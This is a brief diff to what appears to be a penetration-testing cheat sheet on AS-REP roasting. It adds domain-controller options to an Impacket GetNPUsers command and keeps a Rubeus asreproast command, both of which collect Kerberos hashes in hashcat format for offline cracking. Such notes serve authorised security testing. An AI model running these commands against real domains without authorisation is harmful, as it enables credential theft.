@@ -12,7 +12,7 @@
 
 ## Find ASREP hash
 
- - Impacket-GetNPUsers DOMAIN/ -usersfile USERNAMES.TXT -format hashcat -outputfile HASHES.DOMAIN.TXT
+ - Impacket-GetNPUsers DOMAIN/ -usersfile USERNAMES.TXT -format hashcat -dc-ip DC_IP -dc-host DC.DOMAIN.LOCAL -outputfile HASHES.DOMAIN.TXT
 
  - Rubeus.exe asreproast /format:hashcat
 
